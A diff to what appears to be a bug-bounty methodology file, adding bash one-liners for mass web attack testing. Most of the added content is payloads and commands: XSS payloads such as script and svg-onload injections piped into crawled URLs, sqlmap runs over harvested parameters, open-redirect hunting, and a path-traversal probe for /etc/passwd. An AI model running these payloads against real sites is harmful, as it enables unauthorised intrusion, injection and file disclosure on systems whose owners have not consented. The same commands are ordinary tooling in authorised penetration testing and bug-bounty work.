@@ -225,5 +225,42 @@ cat endpoints.txt | nuclei
 ```bash
 nuclei -u https://targets.com:8858 -t /root/nuclei-template/
 ```
-### Use Burpsuite for further exploitation.
+# Use Burpsuite for further exploitation.
+
+- Bash One liners and More.
+
+### XSS 
+```bash
+echo target.com | gau | while read url; python3 xsstrike.py -u $url --crawl -l 2; done;
+```
+```bash
+waybackurls HOST | tee HOST.txt | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \\033[0;31mVulnerable\\n" || echo "$host \\033[0;32mNot Vulnerable\\n";done
+```
+```bash
+cat subdomains.txt | bhedak "\"><svg/onload=alert(1)>*'/---+{{7*7}}"
+```
+```bash
+gospider -S subdomains.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
+```
+### SQL injection 
+
+```bash
+cat subdomains.txt | waybackurls | uro | grep "\?" | httpx -silent > param.txt
+```
+```bash
+sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
+```
+
+### Open Redirect 
+- Try escalating to SSRF 
+
+```bash
+echo "target.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
+```
+### Path Traversal
+```bash
+httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
+```
+
+
 
